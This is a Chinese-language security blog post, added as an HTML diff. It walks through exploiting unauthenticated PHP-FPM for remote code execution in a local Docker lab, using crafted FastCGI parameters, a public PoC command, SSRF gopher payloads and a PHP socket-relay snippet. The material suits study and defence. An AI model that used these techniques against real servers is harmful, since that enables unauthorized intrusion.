@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/atom-one-dark.css">
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>PHP-FPM未授权访问</h1>
+                    <h2 class="subheading">PHP-FPM未授权访问</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on July 14, 2021</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;在看laravel8反序列化漏洞文章的时候，看到作者在下文中提到可以在9000端口利用ftp跟php-fpm达到rce，
+                	对此很感兴趣，借此机会分析一下。这部分内容建议看一下FASTJSON协议与PHP-FPM，PHP-CGI之间的关系，以及在vps上手动配置一下加深理解。
+                	这里有一篇很好的文章推荐一下。</p>
+                	
+                <div>
+                	
+                	<pre class='hljs'><code><span class="hljs-string">https:</span><span class="hljs-comment">//www.xiebruce.top/606.html</span></code></pre>
+                	
+                </div>	
+                
+                <h2 class="section-heading">浅谈攻击原理</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;在TCP模式下，PHP-FPM默认监听9000端口，所以可以通过构造fastcgi协议和fpm进行通信，
+                	SCRIPT_FILENAME的值指定为任意后缀文件，但在PHP 5.3.9之后加入了fpm增加了security.limit_extensions选项，
+                	所以需要去找个PHP文件。</p>
+                	
+                <div>
+                	
+                	<pre class='hljs'><code>{
+    <span class="hljs-string">'GATEWAY_INTERFACE'</span>: <span class="hljs-string">'FastCGI/1.0'</span>,
+    <span class="hljs-string">'REQUEST_METHOD'</span>: <span class="hljs-string">'GET'</span>,
+    <span class="hljs-string">'SCRIPT_FILENAME'</span>: <span class="hljs-string">'/var/www/html/index.php'</span>,
+    <span class="hljs-string">'SCRIPT_NAME'</span>: <span class="hljs-string">'/index.php'</span>,
+    <span class="hljs-string">'QUERY_STRING'</span>: <span class="hljs-string">'?a=1&amp;b=2'</span>,
+    <span class="hljs-string">'REQUEST_URI'</span>: <span class="hljs-string">'/index.php?a=1&amp;b=2'</span>,
+    <span class="hljs-string">'DOCUMENT_ROOT'</span>: <span class="hljs-string">'/var/www/html'</span>,
+    <span class="hljs-string">'SERVER_SOFTWARE'</span>: <span class="hljs-string">'php/fcgiclient'</span>,
+    <span class="hljs-string">'REMOTE_ADDR'</span>: <span class="hljs-string">'127.0.0.1'</span>,
+    <span class="hljs-string">'REMOTE_PORT'</span>: <span class="hljs-string">'17'</span>,
+    <span class="hljs-string">'SERVER_ADDR'</span>: <span class="hljs-string">'127.0.0.1'</span>,
+    <span class="hljs-string">'SERVER_PORT'</span>: <span class="hljs-string">'80'</span>,
+    <span class="hljs-string">'SERVER_NAME'</span>: <span class="hljs-string">"localhost"</span>,
+    <span class="hljs-string">'SERVER_PROTOCOL'</span>: <span class="hljs-string">'HTTP/1.1'</span>
+}</code></pre>
+                	
+                </div>	
+                	
+                <p>&nbsp;&nbsp;&nbsp;那么，有了PHP文件名去执行目标机器上的PHP文件与RCE有什么关系呢？
+                	看到数据包内的auto_prepend_file跟allow_url_include两个字段，是不是感觉很熟悉。
+                	没错，这个就是PHP.ini里面的配置项。修改数据包里的这两个环境变量可以临时改变PHP.ini的配置，
+                	假若设置为auto_prepend_file = php://input且allow_url_include = On的话，
+                	就可以将要执行的PHP指令放在BODY中去远程包含，从而达到RCE的目的。</p>	
+                	
+                <p>&nbsp;&nbsp;&nbsp;这里从p神的EXP中也可以看出怎么构造出的数据包。</p>	
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-14/pop-2.jpg" alt="">
+                </a>	
+                
+                <p>&nbsp;&nbsp;&nbsp;除了TCP模式，还有一个unix套接字是通过读写/run/php/php7.3-fpm.sock来进行通信。
+                	而这种情况需要有特殊的代码段建立sock连接来写入tcp流通信，不能直接通过9000端口来打。</p>
+                
+
+
+                <h2 class="section-heading">配置环境</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;保存以下内容到docker-compose.yml。</p>
+
+								<div>
+									
+								<pre class='hljs'><code><span class="hljs-attribute">version</span>: <span class="hljs-string">'2'</span>
+<span class="hljs-attribute">services</span>:
+ <span class="hljs-attribute">php</span>:
+   <span class="hljs-attribute">image</span>: <span class="hljs-attribute">php</span>:fpm
+   <span class="hljs-attribute">ports</span>:
+    - <span class="hljs-string">"9000:9000"</span></code></pre>
+									
+								</div>
+                	
+                <p>&nbsp;&nbsp;&nbsp;使用以下指令搭建及运行漏洞环境。</p>	
+                	
+                <div>
+                	
+                	<pre class='hljs'><code>docker-compose build &amp;&amp; docker-compose up <span class="hljs-operator">-d</span></code></pre>
+                	
+                </div>	
+                
+                <h2 class="section-heading">TCP模式外网9000端口</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;查看一下php文件，利用条件需要有一个PHP文件，实战中可以使用默认安装环境下的PHP文件。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-14/pop-1.jpg" alt="">
+                </a>	
+                
+                <p>&nbsp;&nbsp;&nbsp;用p神的POC打一下，成功回显执行的代码。</p>
+                
+                <div>
+                	
+                	<pre class='hljs'><code>python poc<span class="hljs-class">.py</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> /usr/local/lib/php/XML/Util<span class="hljs-class">.php</span> -c <span class="hljs-string">"&lt;?php echo \`whoami\`;?&gt;"</span></code></pre>
+                	
+                </div>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-14/pop-3.jpg" alt="">
+                </a>	
+                
+                
+                
+                
+                <h2 class="section-heading">TCP模式内网9000端口</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;如果PHP-FPM监听的是内网的9000端口，那就需要搭配一个ssrf的点来打gopher。
+                	这里用Gopherus-master生成payload。</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-7-14/pop-4.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;这里演示一段curl造成的ssrf漏洞。如果在代码审计中，
+                	遇到像前面文章审出的ssrf无回显的话，就可以直接用来弹个shell。</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-7-14/pop-5.jpg" alt="">
+                </a>
+                
+                 
+                
+                <h2 class="section-heading">UNIX套接字SOCK通信</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;UNIX套接字这种的话，得能与sock建立通信。
+                	配置nginx中的php-fpm模式为UNIX套接字后，在vps上写下代码测试。</p>
+                	
+                <div>
+                	
+<pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+<span class="hljs-variable">$sock</span>=stream_socket_client(<span class="hljs-string">'unix:///run/php/php7.3-fpm.sock'</span>);
+fputs(<span class="hljs-variable">$sock</span>, urldecode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pwn'</span>])));
+var_dump(fread(<span class="hljs-variable">$sock</span>, <span class="hljs-number">4096</span>));
+<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
+                	
+                </div>	
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-7-14/pop-6.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;首先用Gopherus-master生成payload，取_后面的内容进行base64编码。</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-7-14/pop-8.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;再将payload打过去即可回显执行的内容。</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-7-14/pop-7.jpg" alt="">
+                </a>
+                
+                
+
+
+           
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2021</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
